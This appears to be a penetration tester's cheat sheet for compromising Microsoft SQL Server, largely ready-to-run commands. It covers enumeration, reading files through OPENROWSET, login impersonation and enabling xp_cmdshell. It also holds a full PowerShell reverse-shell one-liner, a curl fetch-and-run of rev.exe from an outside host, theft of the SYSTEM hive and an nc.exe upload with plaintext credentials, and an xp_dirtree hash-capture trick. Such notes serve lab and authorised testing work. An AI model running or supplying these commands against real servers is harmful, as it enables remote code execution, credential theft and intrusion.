### MSSQL Default Database
```
Master
Model
Msdb
Tempdb
```
### Queries to run 
```
# Get version
select @@version;
# Get user
select user_name();

#show database 
SELECT name FROM master..sysdatabases;

# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
SELECT * FROM information_schema.tables

# Get table content
> SELECT * FROM <database_name>.dbo.<table_name>

# Read file content
SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
```
### If current user does not have permission o view database
Backgroup  
>SQL (HAERO\discovery  guest@master)> use hrappdb

>ERROR: Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.

Solution
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader

SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
SQL (hrappdb-reader  guest@master)> use hrappdb
```
### Enable command execution
```
enable_xp_cmdshell;
```
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Mssql Connection and Get Reverse Sehll
```
impacket-mssqlclient user:pass@IP
impacket-mssqlclient user:pass@IP -windows-auth

EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.77.153'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```
Or 
```
EXECUTE xp_cmdshell 'curl http://192.168.45.202:8000/rev.exe -o C:\Users\Public\rev.exe';
EXECUTE xp_cmdshell 'c:\users\public\rev.exe';
rlwrap nc -nlvp 4444
```
### Sql authentication vs Windows authentication
>SQL Server Authentication:

>User Credentials: Requires a username and password specific to the SQL Server database.
Authentication Process: The SQL Server validates the username and password provided by the user.
Security Implications: Typically involves storing a username and password in the application's connection string. This method is more vulnerable to security threats if credentials are not adequately protected.
Example connection string using SQL Server Authentication:

>Windows Authentication:

>User Credentials: Relies on the user's Windows credentials (username and password) without requiring a separate SQL Server username and password.
Authentication Process: The SQL Server trusts the Windows authentication process, and the user is authenticated based on their Windows login credentials.
Security Implications: Generally considered more secure as it leverages the security features of the Windows operating system. Credentials are not typically stored in connection strings.

### MSSQL Upload and Download Files
```
proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
proxychains4 -f /etc/proxychains4.conf crackmapexec(nxc) mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
```
### LLMNR/NBT-NS Poisoning through Mssql
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0d89e7ee-4d0a-420b-854e-2ab67c7f3a9a)
```
EXEC xp_dirtree '\\10.10.14.31\share', 1, 1
```
